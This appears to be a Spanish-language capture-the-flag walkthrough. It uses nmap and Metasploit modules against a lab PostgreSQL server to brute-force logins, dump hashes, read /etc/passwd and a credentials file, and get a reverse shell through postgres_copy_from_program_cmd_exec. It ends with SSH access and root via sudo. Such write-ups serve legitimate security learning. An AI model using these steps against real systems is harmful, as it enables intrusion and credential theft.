
Empezamos con un reconocimiento básico de la red con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.253.20 -oN ScanPorts.txt`

Encontramos abiertos los puertos `22 SHH`, `80 HTTP`, `5432 PostgreSQL`.
Usamos [[METASPLOIT]] para buscar un modulo auxiliar que nos ayude con la enumeración de usuarios y credenciales.
`search PostgreSQL `

Usaremos el modulo que hemos encontrado con
`use auxiliary/scanner/postgres/postgres_login` 

Vemos las opciones de configuración y añadimos los datos necesarios.
`set RHOSTS <IP_Victima>`

 Una vez configurado lo ejecutamos con el comando `run`
 Nos encuentra un usuario y una contraseña `postgres:password`
 
Ahora buscaremos un modulo auxiliar que nos permita ver la versión exacta del servicio con esas credenciales
Usaremos el siguiente modulo con el comando.
`use auxiliary/admin/postgres/postgres_sql`

Configuramos los datos que nos solicite.
`set PASSWORD <Password_encontrada>`
`set RHOST <IP_Victima>`
`set USERNAME <Username_Encontrado>`

Ejecutamos con el comando `run`, y se nos muestra la versión exacta del servicio `9.5.21`

Ahora para hacer un volcado de los hashes de los usuarios utilizaremos el siguiente modulo auxiliar.
`use auxiliary/scanner/postgres/postgres_hashdump`

Configuramos las opciones necesarias.
`set RHOSTS <IP_Victima>`
`set PASSWORD <Password_Encontrada>`
`set USERNAME <Username_Encontrado>`

Ahora para leer los ficheros usaremos el modulo auxiliar.
`use auxiliary/admin/postgres/postgres_readfile`

Configuramos lo que sea necesario.
`set RHOSTS <IP_Victima>`
`set PASSWORD <Password_Encontrada>`
`set USERNAME <Username_Encontrado>`

Al inicio del archivo `/etc/passwd` que nos muestra este modulo encontramos que hay una credenciales en un archivo `.txt` en la ruta de `/home/dark/credentials.txt` para consultar que se encuentra dentro de este archivo deberemos de leerlo.
Para leerlo deberemos de configurar de nuevo el `RFILE` para que apunte a esa ruta y poder leer el archivo.
`ser RFILE <Ruta_aapunta>`

En el encontramos las credenciales del usuario `dark:qwerty1234#!hackme`

Ahora usaremos el exploit para poder ejecutar comandos dentro de la base de datos, todo lo que hemos hecho anteriormente era la fase de reconocimiento.
`use exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

Configuramos lo que sea necesario.
`set RHOSTS <IP_Victima>`
`set PASSWORD <Password_Encontrada>`
`set USERNAME <Username_Encontrado>`
`set LHOST <IP_Atacante>`

Ejecutamos el exploit con el comando `run`.
Y obtendremos una shell, pero ya no nos hace falta por que nos podemos conectar por `ssh` ya que conocemos el nombre de usuario `dark` y su contraseña `qwerty1234#!hackme`.

Una vez hayamos accedido con este usuario, podemos ver la configuración de la base de datos en `/var/www/html` si leemos el archivo `config.php` tendremos las credenciales del usuario `alison` y al tener permisos de root podemos acceder a ser root usando `sudo su`.

